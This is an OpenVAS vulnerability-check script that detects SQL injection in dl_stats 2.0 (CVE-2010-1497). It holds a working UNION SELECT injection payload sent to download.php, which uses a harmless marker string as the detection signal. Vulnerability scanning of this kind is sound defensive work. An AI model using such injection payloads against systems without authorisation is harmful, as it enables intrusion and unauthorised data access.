###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_dl_stats_39592.nasl 14 2013-10-27 12:33:37Z jan $
#
# dl_stats Cross Site Scripting and SQL Injection Vulnerabilities
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

include("revisions-lib.inc");
tag_summary = "dl_stats is prone to an SQL-injection vulnerability and multiple cross-
site scripting vulnerabilities.

Exploiting these issues could allow an attacker to steal cookie-based
authentication credentials, control how the site is rendered to the
user, compromise the application, access or modify data, or exploit
latent vulnerabilities in the underlying database.

dl_stats 2.0 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100591);
 script_version("$Revision: 14 $");
 script_tag(name:"last_modification", value:"$Date: 2013-10-27 13:33:37 +0100 (Sun, 27 Oct 2013) $");
 script_tag(name:"creation_date", value:"2010-04-21 13:10:07 +0200 (Wed, 21 Apr 2010)");
 script_tag(name:"cvss_base", value:"4.3");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:N/I:P/A:N");
 script_cve_id("CVE-2010-1497");
 script_bugtraq_id(39592);

 script_name("dl_stats Cross Site Scripting and SQL Injection Vulnerabilities");

desc = "
 Summary:
 " + tag_summary;

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/39592");
 script_xref(name : "URL" , value : "http://dl.clausvb.de/view_file.php?id=10");
 script_xref(name : "URL" , value : "http://www.xenuser.org/2010/04/18/dl_stats-multiple-vulnerabilities-sqli-xss-unprotected-admin-panel/");
 script_xref(name : "URL" , value : "http://www.xenuser.org/documents/security/dl_stats_multiple_vulnerabilities.txt");

 script_tag(name:"risk_factor", value:"Medium");
 script_description(desc);
 script_summary("Determine if dl_stats is prone to an SQL-injection vulnerability");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 if (revcomp(a: OPENVAS_VERSION, b: "6.0+beta5") >= 0) {
   script_tag(name : "summary" , value : tag_summary);
 }
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
   
port = get_http_port(default:80);
if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/dl_stats",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/download.php?id=2+AND+1=2+UNION+SELECT+1,2,3,4,0x4f70656e5641532d53514c2d496e6a656374696f6e2d54657374--"); 

  if(http_vuln_check(port:port,url:url,pattern:"OpenVAS-SQL-Injection-Test")) {
     
    security_warning(port:port);
    exit(0);

  }
}

exit(0);
